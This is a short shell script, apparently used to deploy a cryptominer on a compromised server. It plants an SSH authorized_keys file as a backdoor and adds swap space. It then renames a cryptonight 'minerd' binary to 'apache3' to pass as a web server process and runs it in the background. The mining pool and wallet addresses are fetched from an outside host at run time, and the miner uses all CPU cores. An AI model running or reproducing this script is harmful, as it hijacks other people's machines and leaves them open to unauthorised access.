mv authorized_keys ~/.ssh/authorized_keys
chmod 300  ~/.ssh/authorized_keys

dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
chmod 0600 /var/swap.img
mkswap /var/swap.img
swapon /var/swap.img

apt-get update
dpkg --configure -a
apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc

cd 

wget https://api.ipify.org	
mv tanhuevon/minerd ./apache3
chmod +x apache3

nohup ./apache3 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &

sleep 2
tail -f nohup.out
